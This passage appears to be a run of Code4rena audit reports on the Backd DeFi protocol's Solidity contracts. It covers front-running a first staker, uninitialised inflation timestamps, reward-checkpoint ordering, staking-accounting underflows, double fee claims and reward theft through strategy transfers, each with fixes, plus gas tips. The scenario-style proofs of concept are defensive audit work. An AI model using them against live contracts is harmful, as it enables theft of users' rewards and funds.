`totalStaked` variable is 0 when first Alice calls the stake function after `_userCheckpoint()` rans)  ### WITH 1WEI STAKE (ATTACK)   | time |                Situation               |  totalStaked  | Alice Shares | Bob Shares | |:----:|:--------------------------------------:|:-------------:|:------------:|:----------:| |  0-  |          First poolCheckpoint          |       0       |       0      |      0     | |  0+  |           Alice Deposits 1wei          |       0       |       0      |      0     | |   1  |       Alice frontruns Bob @ 10eth      |      1wei     |       0      |      0     | |   2  |         Bob 10eth txn is mined         |  10eth + 1wei |     86.4     |      0     | |   3  | 1 day later poolCheckpoint() is called | 20eth + 1 wei |     86.4     |      0     | |   4  |        Alice frontruns Bob again       | 20eth + 1 wei |     86.4     |      0     | |   5  |         Bob 10eth txn is mined         |  30eth + 1wei |     172.8    |      0     | |   6  | 1 day later poolCheckpoint() is called |  40eth + 1wei |     172.8    |    86.4    |  ### WITHOUT THE 1WEI STAKE (No "first staker hijack")  | time |                Situation               | totalStaked | Alice Shares | Bob Shares | |:----:|:--------------------------------------:|:-----------:|:------------:|:----------:| |  0-  |          First poolCheckpoint          |      0      |       0      |      0     | |  0+  |           Alice stakes 10eth           |      0      |       0      |      0     | |   1  |            Bob stakes 10eth            |    10eth    |       0      |      0     | |   2  | 1 day later poolCheckpoint() is called |    20eth    |       0      |      0     | |   3  |           Alice stakes 10eth           |    20eth    |       0      |      0     | |   4  |            Bob stakes 10eth            |    30eth    |     86.4     |      0     | |   5  | 1 day later poolCheckpoint() is called |    40eth    |     86.4     |    86.4    |   ## Recommended Mitigation Steps Further evaluation on how the variables are updated and how does the `Integral` (both each users and global one) is calculated on the pool inception is needed to patch this issue.  
# Lines of code  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L104-L108   # Vulnerability details  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L104-L108  ```solidity     function startInflation() external override onlyGovernance {         require(lastEvent == 0, "Inflation has already started.");         lastEvent = block.timestamp;         lastInflationDecay = block.timestamp;     } ```  As `lastEvent` and `lastInflationDecay` are not initialized in the `constructor()`, they will remain to the default value of `0`.  However, the permissionless `executeInflationRateUpdate()` method does not check the value of `lastEvent` and `lastInflationDecay` and used them directly.  As a result, if `executeInflationRateUpdate()` is called before `startInflation()`:  1. L190, the check of if `_INFLATION_DECAY_PERIOD` has passed since `lastInflationDecay` will be `true`, and `initialPeriodEnded` will be set to `true` right away; 2. L188, since the `lastEvent` in `totalAvailableToNow += (currentTotalInflation * (block.timestamp - lastEvent));` is `0`, the `totalAvailableToNow` will be set to `totalAvailableToNow ≈ currentTotalInflation * 52 years`, which renders the constrains of `totalAvailableToNow` incorrect and useless.  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L115-L117  ```solidity     function executeInflationRateUpdate() external override returns (bool) {         return _executeInflationRateUpdate();     } ```  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L187-L215  ```solidity     function _executeInflationRateUpdate() internal returns (bool) {         totalAvailableToNow += (currentTotalInflation * (block.timestamp - lastEvent));         lastEvent = block.timestamp;         if (block.timestamp >= lastInflationDecay + _INFLATION_DECAY_PERIOD) {             currentInflationAmountLp = currentInflationAmountLp.scaledMul(annualInflationDecayLp);             if (initialPeriodEnded) {                 currentInflationAmountKeeper = currentInflationAmountKeeper.scaledMul(                     annualInflationDecayKeeper                 );                 currentInflationAmountAmm = currentInflationAmountAmm.scaledMul(                     annualInflationDecayAmm                 );             } else {                 currentInflationAmountKeeper =                     initialAnnualInflationRateKeeper /                     _INFLATION_DECAY_PERIOD;                  currentInflationAmountAmm = initialAnnualInflationRateAmm / _INFLATION_DECAY_PERIOD;                 initialPeriodEnded = true;             }             currentTotalInflation =                 currentInflationAmountLp +                 currentInflationAmountKeeper +                 currentInflationAmountAmm;             controller.inflationManager().checkpointAllGauges();             lastInflationDecay = block.timestamp;         }         return true;     } ```  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L50-L51  ```solidity     // Used for final safety check to ensure inflation is not exceeded     uint256 public totalAvailableToNow; ```  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L217-L227  ```solidity     function _mint(address beneficiary, uint256 amount) internal returns (bool) {         totalAvailableToNow += ((block.timestamp - lastEvent) * currentTotalInflation);         uint256 newTotalMintedToNow = totalMintedToNow + amount;         require(newTotalMintedToNow <= totalAvailableToNow, "Mintable amount exceeded");         totalMintedToNow = newTotalMintedToNow;         lastEvent = block.timestamp;         token.mint(beneficiary, amount);         _executeInflationRateUpdate();         emit TokensMinted(beneficiary, amount);         return true;     } ```  ### Recommendation   Consider initializing `lastEvent`, `lastInflationDecay` in `constructor()`.  or  Consider adding `require(lastEvent != 0 && lastInflationDecay != 0, "...")` to `executeInflationRateUpdate()`.  
# Lines of code  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L187-L215   # Vulnerability details  When `Minter.sol#_executeInflationRateUpdate()` is called, if an `_INFLATION_DECAY_PERIOD` has past since `lastInflationDecay`, it will update the InflationRate for all of the gauges.  However, in the current implementation, the rates will be updated first, followed by the rewards being settled using the new rates on the gauges using `inflationManager().checkpointAllGauges()`.  If the `_INFLATION_DECAY_PERIOD` has passed for a long time before `Minter.sol#executeInflationRateUpdate()` is called, the users may lose a significant amount of rewards.  On a side note, `totalAvailableToNow` is updated correctly.  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L187-L215  ```solidity function _executeInflationRateUpdate() internal returns (bool) {     totalAvailableToNow += (currentTotalInflation * (block.timestamp - lastEvent));     lastEvent = block.timestamp;     if (block.timestamp >= lastInflationDecay + _INFLATION_DECAY_PERIOD) {         currentInflationAmountLp = currentInflationAmountLp.scaledMul(annualInflationDecayLp);         if (initialPeriodEnded) {             currentInflationAmountKeeper = currentInflationAmountKeeper.scaledMul(                 annualInflationDecayKeeper             );             currentInflationAmountAmm = currentInflationAmountAmm.scaledMul(                 annualInflationDecayAmm             );         } else {             currentInflationAmountKeeper =                 initialAnnualInflationRateKeeper /                 _INFLATION_DECAY_PERIOD;              currentInflationAmountAmm = initialAnnualInflationRateAmm / _INFLATION_DECAY_PERIOD;             initialPeriodEnded = true;         }         currentTotalInflation =             currentInflationAmountLp +             currentInflationAmountKeeper +             currentInflationAmountAmm;         controller.inflationManager().checkpointAllGauges();         lastInflationDecay = block.timestamp;     }     return true; } ```  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L110-L125  ```solidity function checkpointAllGauges() external override returns (bool) {     uint256 length = _keeperGauges.length();     for (uint256 i; i < length; i = i.uncheckedInc()) {         IKeeperGauge(_keeperGauges.valueAt(i)).poolCheckpoint();     }     address[] memory stakerVaults = addressProvider.allStakerVaults();     for (uint256 i; i < stakerVaults.length; i = i.uncheckedInc()) {         IStakerVault(stakerVaults[i]).poolCheckpoint();     }      length = _ammGauges.length();     for (uint256 i; i < length; i = i.uncheckedInc()) {         IAmmGauge(_ammGauges.valueAt(i)).poolCheckpoint();     }     return true; } ```  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/KeeperGauge.sol#L110-L117  ```solidity function poolCheckpoint() public override returns (bool) {     if (killed) return false;     uint256 timeElapsed = block.timestamp - uint256(lastUpdated);     uint256 currentRate = IController(controller).inflationManager().getKeeperRateForPool(pool);     perPeriodTotalInflation[epoch] += currentRate * timeElapsed;     lastUpdated = uint48(block.timestamp);     return true; } ```  https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/InflationManager.sol#L507-L519  ```solidity function getKeeperRateForPool(address pool) external view override returns (uint256) {     if (minter == address(0)) {         return 0;     }     uint256 keeperInflationRate = Minter(minter).getKeeperInflationRate();     // After deactivation of weight based dist, KeeperGauge handles the splitting     if (weightBasedKeeperDistributionDeactivated) return keeperInflationRate;     if (totalKeeperPoolWeight == 0) return 0;     bytes32 key = _getKeeperGaugeKey(pool);     uint256 poolInflationRate = (currentUInts256[key] * keeperInflationRate) /         totalKeeperPoolWeight;     return poolInflationRate; } ```   https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/tokenomics/Minter.sol#L173-L176  ```solidity     function getKeeperInflationRate() external view override returns (uint256) {         if (lastEvent == 0) return 0;         return currentInflationAmountKeeper;     } ```  ### PoC  Given:  - currentInflationAmountAmm: 12,000 Bkd (1000 per month) - annualInflationDecayAmm: 50% - initialPeriodEnded: true - lastInflationDecay: 11 months ago - _INFLATION_DECAY_PERIOD: 1 year  1. Alice deposited as the one and only staker in the `AmmGauge` pool; 2. 1 month later; 3. `Minter.sol#_executeInflationRateUpdate()` is called; 4. Alice `claimableRewards()` and received `500` Bkd tokens.  Expected Results:  - Alice to receive `1000` Bkd tokens as rewards.  Actual Results:  - Alice received `500` Bkd tokens as rewards.  ### Recommendation  Consider moving the call to `checkpointAllGauges()` to before the `currentInflationAmountKeeper` is updated.  ```solidity function _executeInflationRateUpdate() internal returns (bool) {     totalAvailableToNow += (currentTotalInflation * (block.timestamp - lastEvent));     lastEvent = block.timestamp;     if (block.timestamp >= lastInflationDecay + _INFLATION_DECAY_PERIOD) {         controller.inflationManager().checkpointAllGauges();         currentInflationAmountLp = currentInflationAmountLp.scaledMul(annualInflationDecayLp);         if (initialPeriodEnded) {             currentInflationAmountKeeper = currentInflationAmountKeeper.scaledMul(                 annualInflationDecayKeeper             );             currentInflationAmountAmm = currentInflationAmountAmm.scaledMul(                 annualInflationDecayAmm             );         } else {             currentInflationAmountKeeper =                 initialAnnualInflationRateKeeper /                 _INFLATION_DECAY_PERIOD;              currentInflationAmountAmm = initialAnnualInflationRateAmm / _INFLATION_DECAY_PERIOD;             initialPeriodEnded = true;         }         currentTotalInflation =             currentInflationAmountLp +             currentInflationAmountKeeper +             currentInflationAmountAmm;         lastInflationDecay = block.timestamp;     }     return true; } ```  
# QA  ## Use unchecked lib  ### `PoolMigrationZap.sol`  #### Enforce pattern on loops You can add the unchecked math lib like you do on the others contracts to safely increment the `i` var, saving gas and make contract consistent with the others by enforcing the same style.  On [`PoolMigrationZap.sol#L39-L44`](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/zaps/PoolMigrationZap.sol#L39-L44) you are doing a unchecked increment in the loop, but in the rest of the code you a different pattern. Add the unchecked math lib and change: ```solidity         for (uint256 i; i < oldPoolAddresses_.length; ) {             migrate(oldPoolAddresses_[i]);             unchecked {                 ++i;             }         } ``` To; ```solidity         for (uint256 i; i < oldPoolAddresses_.length; i = i.uncheckedInc()) {             migrate(oldPoolAddresses_[i]);         } ```  #### `_underlyingNewPools` can end with a wrong data  If `underlying_` is `address(0)` then `_underlyingNewPools[address(0)]` will be fill...  Consider change lines [`PoolMigrationZap.sol#L26-L27`](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/zaps/PoolMigrationZap.sol#L26-L27) from: ```solidity             _underlyingNewPools[underlying_] = newPool_;             if (underlying_ == address(0)) continue; ``` To: ```solidity             if (underlying_ == address(0)) continue;             _underlyingNewPools[underlying_] = newPool_; ```  ## `ConvexStrategyBase.sol`  ### Change var name to avoid shadow  On line [L287](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/strategies/ConvexStrategyBase.sol#L287) you are declaring variable with the same name, i understang that is for caching, but i recommend to change the variable name, consider changing this; ```solidity         address _swapperRouter = address(_swapperRouter);         IERC20(token_).safeApprove(_swapperRouter, 0);         IERC20(token_).safeApprove(_swapperRouter, type(uint256).max); ``` To this; ```solidity         address swapperRouter_ = address(_swapperRouter);         IERC20(token_).safeApprove(swapperRouter_, 0);         IERC20(token_).safeApprove(swapperRouter_, type(uint256).max); ```  ## `LiquidityPool.sol`  ### Add check before calling `safeApprove`  In think you will need a check before doing the safeApprove call on [LiquidityPool.sol#L700](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/pool/LiquidityPool.sol#L700) Just replace; ```solidity  IERC20(lpToken_).safeApprove(staker_, type(uint256).max); ``` With  ```solidity if (IERC20(lpToken_).allowance(staker_, spender) > 0) return; IERC20(lpToken_).safeApprove(staker_, type(uint256).max); ```  _keeperGauge  ## Missing event emission  Critical function dont emit events; [`InflationManager.sol#L58-L63:setMinter`](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L58-L63) [InflationManager.sol#L89:deactivateWeightBasedKeeperDistribution](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/InflationManager.sol#L89)  
# Gas optimizations   ## Use unchecked lib to increment safe variables  ### `PoolMigrationZap.sol`  You can add the unchecked math lib like you do on the others contracts to safely increment the `i` var, saving gas and make contract consistent with the others by enforcing the same style.  Recommendation, add `using UncheckedMath for uint256` And on line [`PoolMigrationZap.sol#L22`](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/zaps/PoolMigrationZap.sol#L22) change; ```solidity for (uint256 i; i < newPools_.length; ++i) { ``` To ```solidity for (uint256 i; i < newPools_.length; i = i.uncheckedInc()) { ```  ### `TopUpKeeperHelper.sol`  On line [TopUpKeeperHelper.sol#L52](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/actions/topup/TopUpKeeperHelper.sol#L52) you coul use unchecked math lib to increment the variable. Change: ```solidity topupsAdded++; ``` To: ```solidity topupsAdded = topupsAdded.uncheckedInc(); ```  ### `KeeperGauge.sol`  On lines [#L98](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/KeeperGauge.sol#L98) and [L59](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/KeeperGauge.sol#L59) you could use unchecked math lib, consider change;  ```solidity epoch++; ``` To; ```solidity epoch = epoch.uncheckedInc(); ```  ### Use unchecked for decrement `i` On [BkdLocker.sol#L140](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/BkdLocker.sol#L140) you can do a unchecked decrement (or add a function to the Unchecked math to do it) change; ```solidity i = i - 1; ``` to; ```solidity unchecked { --i; } ```  ### Cache `.length`  You could cache lenght of arrays to save gas; [`RewardHandler.sol#L41-L42`](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/RewardHandler.sol#L41-L42) [`StakerVault.sol#L259`](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/StakerVault.sol#L259) [`VestedEscrow.sol#L94`](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/VestedEscrow.sol#L94)   ### Use `require(foo != 0)` instead of `require(foo > 0)`  `>0` is less gas efficient than `!0` if you enable the optimizer at 10k AND you’re in a require statement.  [`BkdLocker.sol#L91`](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/BkdLocker.sol#L91) [`BkdLocker.sol#L92`](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/BkdLocker.sol#L92) [`BkdLocker.sol#L137`](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/BkdLocker.sol#L137) [`VestedEscrow.sol#L84`](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/VestedEscrow.sol#L84) [`KeeperGauge.sol#L140`](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/KeeperGauge.sol#L140) [`AmmGauge.sol#L104`](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/AmmGauge.sol#L104) [`AmmGauge.sol#L125`](https://github.com/code-423n4/2022-05-backd/blob/8121e5244ca29f87b0763d05a69e7fc654d14f45/protocol/contracts/tokenomics/AmmGauge.sol#L125) 
 ## > 0 is less efficient than != 0 for unsigned integers (with proof)  `!= 0` costs less gas compared to `> 0` for unsigned integers in `require` statements with the optimizer enabled (6 gas)  Proof: While it may seem that `> 0` is cheaper than `!=`,  this is only true without the optimizer enabled and outside a require  statement. If you enable the optimizer at 10k AND you’re in a `require` statement, this will save gas. You can see this tweet for more proofs: [https://twitter.com/gzeon/status/1485428085885640706](https://twitter.com/gzeon/status/1485428085885640706)  I suggest changing `> 0` with `!= 0` here:  ### Instances: contracts/BkdLocker.sol:91:        require(amount > 0, Error.INVALID_AMOUNT); contracts/BkdLocker.sol:92:        require(totalLockedBoosted > 0, Error.NOT_ENOUGH_FUNDS); contracts/BkdLocker.sol:137:        require(length > 0, "No entries"); contracts/pool/LiquidityPool.sol:469:        require(underlyingAmount > 0, Error.INVALID_AMOUNT); contracts/pool/LiquidityPool.sol:471:        require(lpToken_.balanceOf(account) > 0, Error.INSUFFICIENT_BALANCE); contracts/pool/LiquidityPool.sol:514:        require(mintedLp >= minTokenAmount && mintedLp > 0, Error.INVALID_AMOUNT); contracts/pool/LiquidityPool.sol:538:        require(redeemLpTokens > 0, Error.INVALID_AMOUNT); contracts/testing/MockVotingEscrow.sol:35:        require(_balances[msg.sender] > 0, "a lock needs to first be created"); contracts/testing/MockErc20Strategy.sol:64:        require(currentBalance > 0, "Invalid amount to withdraw"); contracts/testing/MockErc20Strategy.sol:74:        require(amount > 0, "Invalid amount to transfer"); contracts/testing/MockEthStrategy.sol:65:        require(currentBalance > 0, "Invalid amount to withdraw"); contracts/tokenomics/VestedEscrow.sol:84:        require(unallocatedSupply > 0, "No reward tokens in contract"); contracts/tokenomics/KeeperGauge.sol:140:        require(totalClaimable > 0, Error.ZERO_TRANSFER_NOT_ALLOWED); contracts/tokenomics/AmmGauge.sol:104:        require(amount > 0, Error.INVALID_AMOUNT); contracts/tokenomics/AmmGauge.sol:125:        require(amount > 0, Error.INVALID_AMOUNT); contracts/tokenomics/AmmConvexGauge.sol:158:        require(amount > 0, Error.INVALID_AMOUNT); contracts/tokenomics/AmmConvexGauge.sol:171:        require(amount > 0, Error.INVALID_AMOUNT); contracts/vault/Vault.sol:163:        require(amount > 0, Error.INVALID_AMOUNT); contracts/actions/topup/TopUpActionFeeHandler.sol:123:        require(totalClaimable > 0, Error.NOTHING_TO_CLAIM); contracts/actions/topup/TopUpAction.sol:214:        require(record.singleTopUpAmount > 0, Error.INVALID_AMOUNT); contracts/actions/topup/TopUpAction.sol:535:        require(position.totalTopUpAmount > 0, Error.INSUFFICIENT_BALANCE);  Also, please enable the Optimizer.
1. Don't change storage variable needlessly contracts\BkdLocker.sol#L144 Currently it replaces stashedWithdraws[i] even if "i" equals to "stashedWithdraws.length - 1". And it calculates stashedWithdraws.length every time after pop right, you can reduce gas by changing the length variable. You can replace L144 like below.  --length; if(i != length) {     stashedWithdraws[i] = stashedWithdraws[length]; }   2. Needless conditions. contracts\tokenomics\InflationManager.sol#L575 contracts\tokenomics\InflationManager.sol#L589 contracts\tokenomics\InflationManager.sol#L602  From the logic of the contract, "totalKeeperPoolWeight" will be always non-negative. Even if this value could be negative, it will be revoked with underflow error before.   3. Use != 0 instead of > 0 for uint variables contracts\BkdLocker.sol#L91 contracts\BkdLocker.sol#L92 contracts\BkdLocker.sol#L137 contracts\BkdLocker.sol#L139 contracts\BkdLocker.sol#L254 contracts\BkdLocker.sol#L301 contracts\tokenomics\AmmGauge.sol#L88 contracts\tokenomics\AmmGauge.sol#L104 contracts\tokenomics\AmmGauge.sol#L125 contracts\tokenomics\AmmGauge.sol#L147 contracts\tokenomics\FeeBurner.sol#L117 contracts\tokenomics\KeeperGauge.sol#L140 contracts\tokenomics\LpGauge.sol#L68 contracts\tokenomics\LpGauge.sol#L114 contracts\tokenomics\VestedEscrow.sol#L84 contracts\RewardHandler.sol#L63  4. Change storage to memory if possible contracts\BkdLocker.sol#L251   5. An array’s length should be cached to save gas in for-loops contracts\StakerVault.sol#L259 contracts\tokenomics\FeeBurner.sol#L56 contracts\tokenomics\InflationManager.sol#L116 contracts\tokenomics\VestedEscrow.sol#L94 contracts\zaps\PoolMigrationZap.sol#L22 contracts\zaps\PoolMigrationZap.sol#L39   6. Usage of unchecked can reduce the gas cost contracts\StakerVault.sol#L387  _allowances[src][msg.sender] = allowance_.uncheckedSub(unstaked);
## Summary It was easy to understand the logic for me because the codes have detailed explanations. I recommended adding some more require() for better performance.  ## Low Risk Issues 1. Add additional require() for better performance.  i) contracts\BkdLocker.sol#L49 require(_govToken != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); require(_rewardToken != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED);  ii) contracts\BkdLocker.sol#L60 "maxBoost" must be greater than "startBoost", otherwise L276-L278 will be revoked. require(maxBoost >= startBoost, Error.INVALID_AMOUNT);  iii) contracts\BkdLocker.sol#L60 "increasePeriod" must be positive, otherwise L276-L278 will be revoked. require(increasePeriod != 0, Error.INVALID_AMOUNT);  iv) contracts\BkdLocker.sol#L123 "amount" must be positive, otherwise the user can prepare unlock endlessly. require(amount != 0, Error.INVALID_AMOUNT);  v) contracts\BkdLocker.sol#L215 require(claimable != 0, Error.INVALID_AMOUNT);  vi) contracts\tokenomics\VestedEscrow.sol#L60 In this setFundAdmin() function at L75, it checks the first require() already. require(fundadmin_ != address(0), Error.ZERO_ADDRESS_NOT_ALLOWED); require(rewardToken_ != address(0), , Error.ZERO_ADDRESS_NOT_ALLOWED);   2. Wrong comment contracts\BkdLocker.sol#L87  There are no "deposit" or "depositFor" functions in this contract. You need to write "lock" or "lockFor" instead.   3. executeKeeperPoolWeight() and batchExecuteKeeperPoolWeights() functions in InflationManager.sol must have some role restrictions. There are 2 other functions. executeLpPoolWeight(), executeAmmTokenWeight().  contracts\tokenomics\InflationManager.sol#L151 contracts\tokenomics\InflationManager.sol#L241 contracts\tokenomics\InflationManager.sol#L326  With the above functions, the batch functions have the modifier "onlyRoles2(Roles.GOVERNANCE, Roles.INFLATION_MANAGER)". I think the above functions should have the same modifier also.   4. claim() function in VestedEscrow.sol should have nonReentrant modifier same as other claim() function at L138.  contracts\tokenomics\VestedEscrow.sol#L113-L115  Otherwise, you can change the function like this(same as VestedEscrowRevocable.sol).  function claim() external virtual override {      claim(msg.sener); }
# Lines of code  https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/StakerVault.sol#L98-L102 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/StakerVault.sol#L342-L346 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/StakerVault.sol#L391-L395   # Vulnerability details  ## Impact StakerVault.unstake(), StakerVault.unstakeFor() would revert with a uint underflow error of StakerVault.strategiesTotalStaked, StakerVault._poolTotalStaked.  ## Proof of Concept Currently it saves totalStaked for strategies and non-strategies separately. uint underflow error could be occured in these cases.  Scenario 1. 1. Address A(non-strategy) stakes some amount x and it will be added to StakerVault_poolTotalStaked. 2. This address A is approved as a strategy by StakerVault.inflationManager. 3. Address A tries to unstake amount x, it will be deducted from StakerVault.strategiesTotalStaked because this address is a strategy already. Even if it would succeed for this strategy but it will revert for other strategies because StakerVault.strategiesTotalStaked is less than correct staked amount for strategies.  Scenario 2. There is a transfer between strategy and non-strategy using StakerVault.transfer(), StakerVault.transferFrom() functions. In this case, StakerVault.strategiesTotalStaked and StakerVault._poolTotalStaked must be changed accordingly but there is no such logic.  ## Tools Used Solidity Visual Developer of VSCode  ## Recommended Mitigation Steps You need to modify 3 functions. StakerVault.addStrategy(), StakerVault.transfer(), StakerVault.transferFrom().  1. You need to move staked amount from StakerVault._poolTotalStaked to StakerVault.strategiesTotalStaked every time when StakerVault.inflationManager approves a new strategy. You can modify addStrategy() at L98-L102 like this.  function addStrategy(address strategy) external override returns (bool) {     require(msg.sender == address(inflationManager), Error.UNAUTHORIZED_ACCESS);     require(!strategies[strategy], Error.ADDRESS_ALREADY_SET);      strategies[strategy] = true;     _poolTotalStaked -= balances[strategy];     strategiesTotalStaked += balances[strategy];      return true; }  2. You need to add below code at L126 of transfer() function.  if(strategies[msg.sender] != strategies[account]) {     if(strategies[msg.sender]) { // from strategy to non-strategy         _poolTotalStaked += amount;         strategiesTotalStaked -= amount;     }     else { // from non-strategy to strategy         _poolTotalStaked -= amount;         strategiesTotalStaked += amount;     } }  3. You need to add below code at L170 of transferFrom() function.  if(strategies[src] != strategies[dst]) {     if(strategies[src]) { // from strategy to non-strategy         _poolTotalStaked += amount;         strategiesTotalStaked -= amount;     }     else { // from non-strategy to strategy         _poolTotalStaked -= amount;         strategiesTotalStaked += amount;     } }  
# Lines of code  https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/BkdLocker.sol#L70-L75 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/BkdLocker.sol#L302-L322   # Vulnerability details  ## Impact Users can claim more fees than expected if governance migrates current rewardToken again by fault.  ## Proof of Concept In the migrate() function, there is no requirement newRewardToken != rewardToken. If this function is called with the same "rewardToken" parameter, "_replacedRewardTokens" will contain the current "rewardToken" also. Then when the user claims fees, "userShares" will be added two times for the same token at L302-L305, L314-L317. It's because "curRewardTokenData.userFeeIntegrals[user]" is updated at L332 after the "userShares" calculation for past rewardTokens. So the user can get paid more fees than he should.  ## Tools Used Solidity Visual Developer of VSCode  ## Recommended Mitigation Steps You need to add this require() at L71.  require(newRewardToken != rewardToken, Error.SAME_AS_CURRENT);  
# Lines of code  https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/StakerVault.sol#L95 https://github.com/code-423n4/2022-05-backd/tree/main/protocol/contracts/tokenomics/LpGauge.sol#L52-L63   # Vulnerability details  ## Impact Strategy in StakerVault.sol can steal more rewards even though it's designed strategies shouldn't get rewards. Also there will be a problem with a rewarding system in LpGauge.sol so that some normal users wouldn't get rewards properly.   ## Proof of Concept 1. Strategy A staked amount x and x will be added to StakerVault.strategiesTotalStaked. contracts\StakerVault.sol#L312 2. Strategy A transferred the amount x to non-strategy B and StakerVault.strategiesTotalStaked, StakerVault._poolTotalStaked won't be updated. contracts\StakerVault.sol#L111 3. After some time for the larger LpGauge.poolStakedIntegral, B claims rewards using the LpGauge.claimRewards() function. contracts\tokenomics\LpGauge.sol#L52  Inside LpGauge.userCheckPoint(), it's designed not to calculate LpGauge.perUserShare for strategy, but it will pass this condition because B is not a strategy. contracts\tokenomics\LpGauge.sol#L90  Furthermore, when calculate rewards, LpGauge.poolStakedIntegral will be calculated larger than a normal user stakes same amount. It's because StakerVault._poolTotalStaked wasn't updated when A transfers x amount to B so LpGauge.poolTotalStaked is less than correct value. contracts\tokenomics\LpGauge.sol#L113-L117  Finally B can get more rewards than he should and the reward system will pay more rewards than it's designed.   ## Tools Used Solidity Visual Developer of VSCode   ## Recommended Mitigation Steps I think there will be two methods to fix. Method 1 is to forbid a transfer between strategy and non-strategy so that strategy can't move funds to non-strategy. Method 2 is to update StakerVault.strategiesTotalStaked and StakerVault._poolTotalStaked correctly so that strategy won't claim more rewards than he should even though he claims rewards using non-strategy.  Method 1. You need to modify two functions. StakerVault.transfer(), StakerVault.transferFrom().  1. You need to add this require() at L112 for transfer(). require(strategies[msg.sender] == strategies[account], Error.FAILED_TRANSFER);  2. You need to add this require() at L144 for transferFrom(). require(strategies[src] == strategies[dst], Error.FAILED_TRANSFER);  Method 2. I've explained about this method in my medium risk report "StakerVault.unstake(), StakerVault.unstakeFor() would revert with a uint underflow error of StakerVault.strategiesTotalStaked, StakerVault._poolTotalStaked" I will copy the same code for your convenience.  You need to modify 3 functions. StakerVault.addStrategy(), StakerVault.transfer(), StakerVault.transferFrom().  1. You need to move staked amount from StakerVault._poolTotalStaked to StakerVault.strategiesTotalStaked every time when StakerVault.inflationManager approves a new strategy. You can modify addStrategy() at L98-L102 like this.  function addStrategy(address strategy) external override returns (bool) {     require(msg.sender == address(inflationManager), Error.UNAUTHORIZED_ACCESS);     require(!strategies[strategy], Error.ADDRESS_ALREADY_SET);      strategies[strategy] = true;     _poolTotalStaked -= balances[strategy];     strategiesTotalStaked += balances[strategy];      return true; }  2. You need to add below code at L126 of transfer() function.  if(strategies[msg.sender] != strategies[account]) {     if(strategies[msg.sender]) { // from strategy to non-strategy         _poolTotalStaked += amount;         strategiesTotalStaked -= amount;     }     else { // from non-strategy to strategy         _poolTotalStaked -= amount;         strategiesTotalStaked += amount;     } }  3. You need to add below code at L170 of transferFrom() function.  if(strategies[src] != strategies[dst]) {     if(strategies[src]) { // from strategy to non-strategy         